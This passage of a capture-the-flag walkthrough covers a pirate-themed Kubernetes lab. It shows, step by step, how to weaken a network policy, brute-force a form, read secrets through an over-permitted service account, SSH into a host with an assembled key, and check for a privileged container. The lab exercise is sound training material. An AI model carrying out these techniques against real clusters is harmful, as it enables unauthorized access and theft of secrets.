drwxr-xr-x  3 root root 4096 Nov 20 09:59 .
drwxr-xr-x  1 root root 4096 Nov 20 10:00 ..
drwxr-xr-x 13 root root 4096 Nov 20 09:59 .cache
root@whydah-galley:/mnt# cd .cache
root@whydah-galley:/mnt/.cache# ls -la
total 52
drwxr-xr-x 13 root root 4096 Nov 20 09:59 .
drwxr-xr-x  3 root root 4096 Nov 20 09:59 ..
drwxr-xr-x  3 root root 4096 Nov 20 09:59 bow
drwxr-xr-x  2 root root 4096 Nov 20 09:59 bowsprit
drwxr-xr-x  3 root root 4096 Nov 20 09:59 crows-nest
drwxr-xr-x  4 root root 4096 Nov 20 09:59 forecastle
drwxr-xr-x  2 root root 4096 Nov 20 09:59 helm
drwxr-xr-x  2 root root 4096 Nov 20 09:59 hold
drwxr-xr-x  2 root root 4096 Nov 20 09:59 hull
drwxr-xr-x  2 root root 4096 Nov 20 09:59 poop-deck
drwxr-xr-x  2 root root 4096 Nov 20 09:59 ratlines
drwxr-xr-x  2 root root 4096 Nov 20 09:59 stern
drwxr-xr-x  2 root root 4096 Nov 20 09:59 yardarm
```

Within the `.cache` directory we find a number of directories which are named after parts of a ship. Within the forecastle we find the `treasure-map-4`.

```bash
root@whydah-galley:/mnt/.cache# cat forecastle/secret-compartment/treasure-map-4 | base64 -d
tUS60nkMIgX3sP65UFXEDIjUJ93cQvfLY0W4eeHrYac2SZ4j8KeSH8wflTUoy88OcFl7f3
JP3oJ1MVVFVrH8L6iNSLcAAAADAQABAAACAACqSW0r/cSXzBHEm4PW2bd3jXA8182fnaQK
UH1I8aTajZw3EP4/FkBP+3IeMQNOjdvsq1hEeeJ5MmjX5U2TUJuY7yzgVA9oIMyQPOTt3D
SjI8i0tvD76pVBxRTXYWCvoXIeLMcRW7ZoTw8Cptgk2CH9eNLKTKp1FpUqu3HwIZ/CzyLw
Ds8Z/pWp/a/L4kFye6iRfocZMQUY0ZVubSrZ1zvlPjdRT/ix4BdECv/FskF72zJ2WBFR5C
zgu41MAldJVahvORfs1GaP0fY6k79+unE+O0Dp9inuWSoynW1cFjAffy09Bcsv53l+I+BV
oZXZvhc5nXtEAnCRUtP44IYKh7EjiJpY+iUibjjkElox2TlgYBRpMwKRuq/Fw3l2vBK8fO
```

If we enumerate further we find the first flag.

```bash
root@whydah-galley:/mnt/.cache# cat crows-nest/flag | base64 -d
flag_ctf{BOARDED_THE_NEFARIOUS_SHIP_WHY_DAH_DO_THAT}
```

### Step 5: Enumerating the Indian Ocean and modifing the network policy

According to the "Path of the Pirate" we need to head to the Indian Ocean. Let's enumerate our permissions in the `indian` namespace.

```bash
root@whydah-galley:/# kubectl auth can-i --list -n indian
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
networkpolicies.networking.k8s.io               []                                    []               [get list patch update]
configmaps                                      []                                    []               [get list]
namespaces                                      []                                    []               [get list]
pods                                            []                                    []               [get list]
services                                        []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
pods/log                                        []                                    []               [get]
```

There are an awful lot of permissions here, so let's break it down. We `get` and `list` configmaps, pods and services. We also have permissions to `get`, `list`, `patch` and `update` network policies. Lastly, we have permissions to `get` pods logs.

Let's see what pods are running in the `indian` namespace.

```bash
root@whydah-galley:/# kubectl get pods -n indian
NAME               READY   STATUS    RESTARTS   AGE
adventure-galley   1/1     Running   0          4h33m
```

Now let's have a look at the services available.

```bash
root@whydah-galley:/# kubectl get services -n indian
NAME            TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE
crack-in-hull   ClusterIP   10.97.133.159   <none>        8080/TCP   4h34m
```

Interesting, let's try and curl the service.

```bash
root@whydah-galley:/# curl http://crack-in-hull.indian.svc.cluster.local:8080/

```

It seems that are request has timed out. As we have access to network policies, it could be that there is a network policy blocking our request. Let's have a look at the network policies.

```bash
root@whydah-galley:/# kubectl get networkpolicies -n indian
NAME       POD-SELECTOR            AGE
blockade   ship=adventure-galley   4h39m
root@whydah-galley:/# kubectl get networkpolicies -n indian -oyaml
apiVersion: v1
items:
- apiVersion: networking.k8s.io/v1
  kind: NetworkPolicy
  metadata:
    annotations:
      kubectl.kubernetes.io/last-applied-configuration: |
        {"apiVersion":"networking.k8s.io/v1","kind":"NetworkPolicy","metadata":{"annotations":{},"name":"blockade","namespace":"indian"},"spec":{"ingress":[{"from":[{"podSelector":{}}]}],"podSelector":{"matchLabels":{"ship":"adventure-galley"}}}}
    creationTimestamp: "2023-11-20T09:59:56Z"
    generation: 1
    name: blockade
    namespace: indian
    resourceVersion: "975"
    uid: 4a223409-8c85-48e4-94f1-aa8b3c37f641
  spec:
    ingress:
    - from:
      - podSelector: {}
    podSelector:
      matchLabels:
        ship: adventure-galley
    policyTypes:
    - Ingress
  status: {}
kind: List
metadata:
  resourceVersion: ""
```

It would seem that we are correct. The network policy is blocking all ingress traffic to the `adventure-galley` pod so let's modify it to allow ingress traffic. This can be achieved with the following network policy.

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: blockade
  namespace: indian
spec:
  podSelector:
    matchLabels:
      ship: adventure-galley
  ingress:
  - {}
```

> Note: You may need to install an editor on the whydah-galley. This is simply done with `apt update && apt install <editor>`

```bash
root@whydah-galley:/# kubectl apply -f np.yaml
networkpolicy.networking.k8s.io/blockade configured
```

Let's try send http request to the service again:

```bash
root@whydah-galley:/# curl http://crack-in-hull.indian.svc.cluster.local:8080/

<!DOCTYPE html>
<html>
<head>
  <h3>Adventure Galley</h3>
  <meta charset="UTF-8" />
</head>
<body>
  <p>You see a weakness in the Adventure Galley. Perform an Action with an Object to reduce the pirate ship to Logs.</p>
<div>
  <form method="POST" action="/">
    <input type="text" id="Action" name="a" placeholder="Action"><br>
    <input type="text" id="Object" name="o" placeholder="Object"><br>
    <button>Enter</button>
  </form>
</div>
</body>
</html>
```

### Step 6: Exploiting the crack-in-hull service and obtaining the fifth piece of the map

The results from the HTTP request is interesting. It seems that we need to perform the correct action with the correct object with a POST request to the endpoint. Given that we have permissions to `get` pod/logs and the body stating the pirate ship is reduced to logs, it is likely that a log would be admitted from the pod.

The only issue is that we don't know what action or object to use but we do have `get` and `list` to configmaps so let's look into that.

```bash
root@whydah-galley:/# kubectl get configmaps -n indian
NAME               DATA   AGE
kube-root-ca.crt   1      4h58m
options            2      4h58m
```

The `options` configmap seems interesting. Let's have a look at the contents.

```bash
root@whydah-galley:/# kubectl get configmaps options -n indian -oyaml
```

```yaml
apiVersion: v1
data:
  action: |
    - "use"
    - "fire"
    - "launch"
    - "throw"
  object: |
    - "digital-parrot-clutching-a-cursed-usb"
    - "rubber-chicken-with-a-pulley-in-the-middle"
    - "cyber-trojan-cracking-cannonball"
    - "hashjack-hypertext-harpoon"
kind: ConfigMap
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","data":{"action":"- \"use\"\n- \"fire\"\n- \"launch\"\n- \"throw\"\n","object":"- \"digital-parrot-clutching-a-cursed-usb\"\n- \"rubber-chicken-with-a-pulley-in-the-middle\"\n- \"cyber-trojan-cracking-cannonball\"\n- \"hashjack-hypertext-harpoon\"\n"},"kind":"ConfigMap","metadata":{"annotations":{},"name":"options","namespace":"indian"}}
  creationTimestamp: "2023-11-20T09:59:56Z"
  name: options
  namespace: indian
  resourceVersion: "974"
  uid: 03b6b912-e835-4cfd-90fc-1a23394e9b31
```

Great. Looks like we found our action and object. Let's try and send a POST request to the service. At this point, we could manually try to use each action with each object but this could easily be achieved with a simple bash script.

```bash
root@whydah-galley:~# A=("use" "fire" "launch" "throw"); O=("digital-parrot-clutching-a-cursed-usb" "rubber-chicken-with-a-pulley-in-the-middle" "cyber-trojan-cracking-cannonball" "hashjack-hypertext-harpoon"); for a in "${A[@]}"; do for o in "${O[@]}"; do curl -X POST -d "a=$a&o=$o" http://crack-in-hull.indian.svc.cluster.local:8080/; done; done
NO EFFECT
NO EFFECT
NO EFFECT
NO EFFECT
NO EFFECT
NO EFFECT
NO EFFECT
NO EFFECT
NO EFFECT
NO EFFECT
DIRECT HIT! It looks like something fell out of the hold.
NO EFFECT
NO EFFECT
NO EFFECT
NO EFFECT
NO EFFECT
```

Great. It seems like something has happened with one of our requests. Let's have a look at the logs of the `adventure-galley` pod.

```bash
root@whydah-galley:~# kubectl logs adventure-galley -n indian
2023/11/20 15:08:13 starting server on :8080
2023/11/20 15:21:27 treasure-map-5: qm9IZskNawm5JCxuntCHg2+bPirtqNZcqUV2wWxVmKOKHTc4Y58UESTMiOvvPFFcOuT5vi
F7V5FIgpSEYfMy71CVmGmo0lJQAFZmVDf0PQjiLhYDn/x+MS2viTSzIau8IBu0Bu0rjXIa
DTDOJUsuKRyQ9EIBWduk2S3+d+LqXTx5v2YqIPZ+5q4dpDlmenHN7foEVyC6hHGgmHFgJ2
69HtZ8HWVtkwv+4maQevZCPnm5CpedgmGYX1dIOMXt/4YR4Pr6zK6W9R3Mcv+FJVDMqE3R
Q0v4m+CgvDanbYaULpAAABAQCPM+Hn3eTgx6//vBLEMz7EccyOAKFr/DrYtg+OjLRhZicZ
cYqHvP6uoc9MA3fQK2YCZxFO82MpBYuBnh6ypPoPIn2VhJRlwvz9fd7KtKRZrZgE0WXG9h
eEoqyvsWQj1IU2aZ5mpjG8A8+fNoT7RROR4M8Lr1g7nTMZy922jUWFyFg52AcaMF3jxY2n
```

We have our fifth piece of the map. Let's add it to the rest of the pieces and move onto the `south-pacific`

### Step 7: Using a deployment in the South Pacific and adhering to Pod Security Standards

Let's enumerate our permissions in the `south-pacific` namespace.

```bash
root@whydah-galley:~# kubectl auth can-i --list -n south-pacific
Resources                                       Non-Resource URLs                     Resource Names   Verbs
pods/exec                                       []                                    []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
deployments.apps                                []                                    []               [get list create patch update delete]
namespaces                                      []                                    []               [get list]
pods                                            []                                    []               [get list]
serviceaccounts                                 []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

The most significant permission here is the ability to `create` deployments and `exec` into pods within the `south-pacific` namespace. Once again we have permissions to `get` and `list` service accounts in the namespace so much like we did for the `south-atlantic` namespace if we deploy a pod we may need to use a specific service account.

Let's enumerate the service accounts in the `south-pacific` namespace.

```bash
root@whydah-galley:~# kubectl get serviceaccounts -n south-pacific
NAME          SECRETS   AGE
default       0         39m
port-finder   0         39m
```

We've found another service account called `port-finder`. Let's create a deployment and include the service account.

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: invader
  labels:
    app: invader
  namespace: south-pacific
spec:
  selector:
    matchLabels:
      app: invader
  replicas: 1
  template:
    metadata:
      labels:
        app: invader
    spec:
      serviceAccountName: port-finder
      containers:
      - name: invader
        image: ttl.sh/invader-sag34afsa-wakeward:12h
        command: ["sleep", "2d"]
        imagePullPolicy: IfNotPresent
```

> Note: The image within the deployment is using `ttl.sh` which is a annoymous and ephemerial registry which is excellent for images you may not want to persist for a long time. For more information, please see https://ttl.sh/.

```bash
root@whydah-galley:~# kubectl apply -f deploy.yaml
Warning: would violate PodSecurity "restricted:latest": allowPrivilegeEscalation != false (container "invader" must set securityContext.allowPrivilegeEscalation=false), unrestricted capabilities (container "invader" must set securityContext.capabilities.drop=["ALL"]), runAsNonRoot != true (pod or container "invader" must set securityContext.runAsNonRoot=true), seccompProfile (pod or container "invader" must set securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")
deployment.apps/invader created
```

Okay it seems that our deployment has been blocked by Pod Security Standards (PSS). PSS is a framework that restrict privileges for different kinds of pods and users. There three different policies to broadly cover the security spectrum and in this instance the `restricted` policy has been applied. To understand the requirements, please review the following https://kubernetes.io/docs/concepts/security/pod-security-standards/#restricted.

Even though it states our deployment has been created, if we review the deployment we see it is `0/1` is ready.

```bash
deployment.apps/invader created
root@whydah-galley:~# kubectl get deployments -n south-pacific
NAME      READY   UP-TO-DATE   AVAILABLE   AGE
invader   0/1     0            0           2m47s
```

Let's modify the deployment to include the required security context and seccomp profile.

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: invader
  labels:
    app: invader
  namespace: south-pacific
spec:
  selector:
    matchLabels:
      app: invader
  replicas: 1
  template:
    metadata:
      labels:
        app: invader
    spec:
      serviceAccountName: port-finder
      securityContext:
        seccompProfile:
          type: RuntimeDefault
      containers:
      - name: invader
        image: ttl.sh/invader-sag34afsa-wakeward:12h
        command: ["sleep", "2d"]
        imagePullPolicy: IfNotPresent
        securityContext:
          allowPrivilegeEscalation: false
          capabilities:
            drop:
            - "ALL"
          runAsNonRoot: true
          runAsUser: 1000
          runAsGroup: 2000
```

```bash
root@whydah-galley:~# kubectl apply -f deploy.yaml
deployment.apps/invader configured

root@whydah-galley:~# kubectl get pods -n south-pacific
NAME                      READY   STATUS    RESTARTS   AGE
invader-55f8b55bd-wsbl4   1/1     Running   0          4m43s
```

Excellent our deployment has worked.

> Note: As we are using a pod under the restrictions of PSS, we should include several tools within the container image as it will not be running as root, making it challenging to install binaries when deployed. For the following steps, ensure that the container image has `kubectl`, `jq`, and `openssh-client` installed.

### Step 8: Obtaining the sixth piece of the map and ssh into the Royal Fortune

Let's access our deployed pod and see what the pod-finder service account has permissions to do.

```bash
root@whydah-galley:~# kubectl exec -it invader-55f8b55bd-wsbl4 -n south-pacific -- /bin/bash
swashbyter@invader-55f8b55bd-wsbl4:/$

swashbyter@invader-55f8b55bd-wsbl4:/$ kubectl auth can-i --list -n south-pacific
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
secrets                                         []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

We have access to secrets, so let's enumerate secrets and see what is there.

```bash
swashbyter@invader-55f8b55bd-wsbl4:/$ kubectl get secrets -n south-pacific
NAME             TYPE     DATA   AGE
treasure-map-6   Opaque   1      63m
```

We can use the same command we did earlier for the `treasure-map-2` secret and get the sixth piece of the map.

```bash
swashbyter@invader-55f8b55bd-wsbl4:/$ kubectl get secrets treasure-map-6 -n south-pacific -ojson | jq -Mr '.data."treasure-map-6"' | base64 -d
sNbNUb6lfcrFqy4guha1AaWY3m+W41fPW+LD9hTu7tnSDB7uyuBSjn/Eek0OohopdlVEb0
mQxldbpIc2qzvNB/yP8quwvv96SyjkVyQwUNyOLqgJMP9gAeRyHRZup4AnWKm3mPT7RDe7
fN6s1kJijzVOcA0xAAABAQDnCSGsjHx/zPPncT6C51IyKosnbMAk7oS8Nd6nSe3UnAwdOZ
rbZpU/nsuCN2+CXo5rUSCXi5IE6/gVTZJUGrPICIXXKl6h8YmBZiGUVk1lvsjVGZyb1JEL
wBwA7qbC89z1eHY+2HKnGcNtxjnQ3H0KHTDzWA/D7BBdyf9rwEqgFn+FvAPC26mN5Eanc9
FLvai+0MJJoOnQNjQ82v8cgvXAxwbByMpP636sYFrMfqdTz0qtnzMP7sVXOkeEqtlUn0/u
Qut7M9+qPKSD7L2wzymZgw3euu9YqAn+Qp09t9aqWcgUnPLCOCydjpyxB1RnZk233xg+UL
```

We've finally completed the map so let's put it all together and "sail" to the `north-pacific` namespace. Let's see if our service account has access to any interesting resources.

```bash
swashbyter@invader-55f8b55bd-wsbl4:/$ kubectl auth can-i --list -n north-pacific
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
services                                        []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

We have access to `get` and `list` services. Let's see what services are available.

```bash
swashbyter@invader-55f8b55bd-wsbl4:/$ kubectl get services -n north-pacific
NAME            TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)   AGE
plot-a-course   ClusterIP   10.106.69.246   <none>        22/TCP    84m
```

Looks like we can use `plot-a-course` service to ssh into the `Royal Fortune`. Let's try and ssh into the service.

> Note: We'll need a writeable directory to store the ssh key. We can use the `/tmp` or `home` directory for this. We'll also need to `chmod 600` the key as ssh will not accept the key if it is not secure.

```bash
swashbyter@invader-55f8b55bd-wsbl4:~$ ssh -i key -p 22 root@10.106.69.246

| ___ \  _  \ \ / / _ \ | |     |  ___|  _  | ___ \_   _| | | | \ | ||  ___|
| |_/ / | | |\ V / /_\ \| |     | |_  | | | | |_/ / | | | | | |  \| || |__
|    /| | | | \ /|  _  || |     |  _| | | | |    /  | | | | | | . ` ||  __|
| |\ \\ \_/ / | || | | || |____ | |   \ \_/ / |\ \  | | | |_| | |\  || |___
\_| \_|\___/  \_/\_| |_/\_____/ \_|    \___/\_| \_| \_/  \___/\_| \_/\____/

                    ____...------------...____
               _.-'  /o/__ ____ __ __  __ \o\_ '-._
             .'     / /                    \ \     '.
             |=====/o/======================\o\=====|
             |____/_/________..____..________\_\____|
             /   _/ \_     <_o#\__/#o_>     _/ \_
             \________________\####/________________/
              |===\!/========================\!/===|
              |   |=|          .---.         |=|   |
              |===|o|=========/     \========|o|===|
              |   | |         \() ()/        | |   |
              |===|o|======{'-.) A (.-'}=====|o|===|
              | __/ \__     '-.\uuu/.-'    __/ \__ |
              |==== .'.'^'.'.====|=== .'.'^'.'.====|
              |  _\o/   __  {.' __  '.} _   _\o/  _|
              |====================================|

          WELCOME TO THE ROYAL FORTUNE, ENTER AND PLUNDER!

root@royal-fortune:~#
```

We've in!

### Step 9: Escaping the Royal Fortune and obtaining the last flag

Let's enumerate the Royal Fortune.

```bash
root@royal-fortune:~# env
SHELL=/bin/bash
PWD=/root
LOGNAME=root
MOTD_SHOWN=pam
HOME=/root
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=192.168.109.68 49202 192.168.72.4 2222
TERM=xterm
USER=root
SHLVL=1
SSH_CLIENT=192.168.109.68 49202 2222
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
SSH_TTY=/dev/pts/0
_=/usr/bin/env
```

The environment variables does not indicate we have access to Kubernetes. There isn't anything sensitive in the root directory, other than our `authorized_keys`.

```bash
root@royal-fortune:~# ls -la /root/
total 24
drwx------ 1 root root 4096 Nov 20 16:37 .
drwxr-xr-x 1 root root 4096 Nov 20 15:08 ..
-rw-r--r-- 1 root root 3106 Oct 15  2021 .bashrc
drwx------ 2 root root 4096 Nov 20 16:37 .cache
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
drwxr-xr-x 2 root root 4096 Aug 16 16:04 .ssh
root@royal-fortune:~# cat .ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCw2jA/yOUV4H5ADct/mcMOTMDzT32g47bx7uUZ5OyTrWYONCSsexCDGTFvRCkFQyh7GK9ykpeTCb6dIvFuNSfkhbxMViH/KDKRbxRsyqe4sxD5xG/ZbR3HPy7ZiMufbKoPLyUexyvlBShQtI4RVO2nUEsMEiD7EjdOvJx6G5X1BqTdaSYSfVZdBx1gqEwoO052jVdVY02rte6awMBq+mBPbKSr6GnwQ0hTOOAh9Jrt8SELd3aQUHtYsxM+YDVFw7T8PdJ1RnCRn/WqXGftzQvp2hb/tERunfUko7MfK6sOuz+YWmLhDKFix8hpa2fVwqpJbky6aJYmLhtPJFgw3fhkkD8f0A03QEUZTVwiygdXReOyO5F//tYadyRVxgCrcujQH8VlNAVmfk0w3Or1B7PuiBOvZwqNJblfJU+W+CCwP22vF8CH36bgLCqMDVy2xMBOaIAWpbarkwkee6ayQd8BLWgX0RrB0DXoE8NDBK1+SN1r+QHesCELl75tAioWu8CLFT6OHCx1BT8tX6JnpdFuufRP+bR7hL4U6TOXxM0V33Wf4wANbC8qw2DMypV8vT9JYOKyKzhKHnhl1qm1RLrSeQwiBfew/rlQVcQMiNQn3dxC98tjRbh54ethpzZJniPwp5IfzB+VNSjLzw5wWXt/ck/egnUxVUVWsfwvqI1Itw== root@royal-fortuneroot@royal-fortune:~#
```

Let's see have a look under `/proc` and see what processes we have access to.

```bash
root@royal-fortune:~# ls -la /proc
total 4
dr-xr-xr-x 210 root             root                           0 Nov 20 15:08 .
drwxr-xr-x   1 root             root                        4096 Nov 20 15:08 ..
dr-xr-xr-x   9 root             root                           0 Nov 20 16:37 1
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 10
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 100
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 101
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 102
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 103
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 104
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 105
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 106
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 107
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 108
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 11
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 110
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 1111
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 112
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 113
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 114
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 12
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 12215
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 123
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 126
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 127
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 13
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 132
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 133
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 134
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 14
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 15
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 1543
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 16
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 1604
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 174
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 18
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 19
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 2
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 20
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 207
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 21
dr-xr-xr-x   9 root             root                           0 Nov 20 16:46 210
...
```

Wow. It looks like we have a lot of processes running on the system which may indicate we have access to the host pid. It is highly likely we are running in a privileged container.

We can confirm whether we are running in a privileged container by using `capsh` but it is currenty not installed on the system. We can use `apt` to install it.

```bash
root@royal-fortune:/# apt update && apt-get install -y libcap2-bin
Hit:1 http://archive.ubuntu.com/ubuntu jammy InRelease
Get:2 http://security.ubuntu.com/ubuntu jammy-security InRelease [110 kB]
Get:3 http://archive.ubuntu.com/ubuntu jammy-updates InRelease [119 kB]
Get:4 http://archive.ubuntu.com/ubuntu jammy-backports InRelease [109 kB]
Get:5 http://security.ubuntu.com/ubuntu jammy-security/main amd64 Packages [1204 kB]
Get:6 http://archive.ubuntu.com/ubuntu jammy-updates/multiverse amd64 Packages [49.8 kB]
Get:7 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 Packages [1473 kB]
Get:8 http://archive.ubuntu.com/ubuntu jammy-updates/restricted amd64 Packages [1430 kB]
Get:9 http://archive.ubuntu.com/ubuntu jammy-updates/universe amd64 Packages [1278 kB]
Get:10 http://security.ubuntu.com/ubuntu jammy-security/restricted amd64 Packages [1404 kB]
Get:11 http://archive.ubuntu.com/ubuntu jammy-backports/universe amd64 Packages [32.6 kB]
Get:12 http://archive.ubuntu.com/ubuntu jammy-backports/main amd64 Packages [78.3 kB]
Get:13 http://security.ubuntu.com/ubuntu jammy-security/multiverse amd64 Packages [44.0 kB]
Get:14 http://security.ubuntu.com/ubuntu jammy-security/universe amd64 Packages [1011 kB]
Fetched 8342 kB in 1s (5619 kB/s)
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
26 packages can be upgraded. Run 'apt list --upgradable' to see them.
...
```

Now we can use `capsh` to confirm whether we are running in a privileged container.

```bash
root@royal-fortune:/# capsh --print
Current: =ep
